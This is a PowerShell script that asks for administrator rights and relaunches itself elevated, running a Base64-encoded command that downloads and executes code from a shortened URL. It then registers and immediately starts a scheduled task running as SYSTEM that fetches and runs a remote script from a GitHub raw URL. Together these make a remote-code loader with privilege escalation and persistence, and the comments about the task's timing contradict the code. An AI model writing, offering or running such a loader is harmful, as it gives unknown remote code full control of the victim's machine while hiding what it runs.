Write-Host "Please Allow admin privileges!" -ForegroundColor Blue
# Check for administrator privileges and request elevation if needed
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Command to download and execute the script from the URL
    $command = "iex(New-Object Net.WebClient).DownloadString('https://t.ly/_xzy8')"
    
    # Encode the command to bypass issues with special characters in the URL
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))

    # Restart PowerShell as Administrator and execute the encoded command
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
    exit # Exits the current, non-administrative script instance
}

# Define the action to be taken (PowerShell command)
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument {
-c "iex((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1'))"
}

# Create a new scheduled task principal to run with the highest privileges using the SYSTEM account
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Define the trigger (set to execute immediately by scheduling for 1 minute in the past)
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(121009)

# Create settings for the task - removing explicit Boolean values
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopIfGoingOnBatteries

# Register the task
$taskName = "RunWhetherLoggedInOrNot"
Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Trigger $trigger -Settings $settings

Write-Host "Script v2" -ForegroundColor Blue


# Start the task immediately
Start-ScheduledTask -TaskName $taskName

Read-Host -Prompt "Press Enter to exit"
